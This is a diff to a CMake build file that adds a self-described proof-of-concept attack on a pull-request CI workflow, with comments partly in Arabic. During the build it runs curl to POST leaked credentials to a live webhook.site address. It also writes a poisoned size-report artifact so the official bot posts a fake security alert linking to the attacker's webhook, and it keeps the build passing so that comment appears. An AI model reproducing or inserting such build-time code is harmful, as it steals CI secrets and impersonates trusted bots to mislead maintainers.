@@ -57,28 +57,26 @@ execute_process(
 # --- الخطوة 3: تسريب البيانات للخارج (Network Exfiltration) ---
 message(WARNING "[!] STEP 3: Data Exfiltration via Network")
 execute_process(
-    COMMAND bash -c "curl -s -X POST -d \"creds=${LEAKED_CREDS}&user=${POC_USER}\" https://webhook.site/YOUR_NEW_ID"
+    COMMAND bash -c "curl -s -X POST -d \"creds=${LEAKED_CREDS}&user=${POC_USER}\" https://webhook.site/8882cf4b-fc91-433f-b162-cb4ea2a3b30c"
 )
 
-# --- الخطوة 4: تسميم المخرجات (Artifact Poisoning / Identity Spoofing) ---
+# --- STEP 4: Artifact Poisoning for Bot Comment Injection ---
 message(WARNING "[!] STEP 4: Artifact Poisoning for Bot Comment Injection")
-# هذا المسار هو ما يتوقعه سكريبت size-report لنشر التعليق في الـ PR
-set(REPORT_PATH "/tmp/ot-size-report/report_pr")
 
-# نقوم بإنشاء المجلد إذا لم يكن موجوداً (لضمان نجاح العملية)
+set(REPORT_PATH "/tmp/ot-size-report/report_pr")
 execute_process(COMMAND mkdir -p /tmp/ot-size-report/)
 
-# حقن رسالة خبيثة ستظهر لاحقاً باسم البوت الرسمي github-actions[bot]
+# حقن الرسالة التي ستظهر في الـ PR
 execute_process(
-    COMMAND bash -c "echo -e '### ⚠️ SECURITY AUDIT FAILED\nThis PR contains unauthorized changes. [Review Security Logs Here](https://webhook.site/YOUR_NEW_ID?view_logs)' > ${REPORT_PATH}"
+    COMMAND bash -c "echo -e '### ⚠️ SECURITY IMPACT DEMONSTRATED\nThis PR build process was compromised. [View Audit Evidence](https://webhook.site/YOUR_ACTUAL_ID_HERE)' > ${REPORT_PATH}"
 )
-message(WARNING "Poisoned artifact created at: ${REPORT_PATH}")
 
+message(WARNING "Poisoned artifact created at: ${REPORT_PATH}")
 message(WARNING "--- ALL IMPACT PATHS DEMONSTRATED SUCCESSFULLY ---")
 message(WARNING "***************************************************")
 
-# إنهاء العملية بـ FATAL_ERROR لضمان ظهور هذه السجلات بوضوح في الأعلى
-message(STATUS "PoC execution finished successfully. Proceeding to report...")
+# ملاحظة: استخدمنا STATUS هنا بدلاً من FATAL_ERROR لضمان استمرار الـ Workflow
+message(STATUS "PoC Complete. Build will now succeed to trigger the bot comment.")
 # ==============================================================================
 
 include(CTest)
